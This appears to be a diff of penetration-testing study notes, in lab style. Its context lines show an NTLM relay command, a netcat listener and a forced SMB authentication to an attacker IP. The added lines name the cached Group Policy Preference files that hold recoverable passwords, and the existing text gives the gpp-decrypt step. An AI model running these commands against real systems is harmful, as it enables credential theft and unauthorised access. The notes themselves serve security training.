@@ -167,7 +167,17 @@ kali: impacket-ntlmrelayx --no-http-server -smb2support -t 192.168.50.212 -c "po
 kali: nc -nvlp 8080
 files01: dir \\192.168.119.2\test
 ```
-### Decrypting GPP Password
+### Cached GPP Password
+>Search in C:\ProgramData\Microsoft\Group Policy\history or in C:\Documents and Settings\All Users\Application Data\Microsoft\Group Policy\history (previous to W Vista) for these files:
+```
+Groups.xml
+Services.xml
+Scheduledtasks.xml
+DataSources.xml
+Printers.xml
+Drives.xml
+```
+Decrypting GPP Password
 ```
 gpp-decrypt "gpp"
 ```
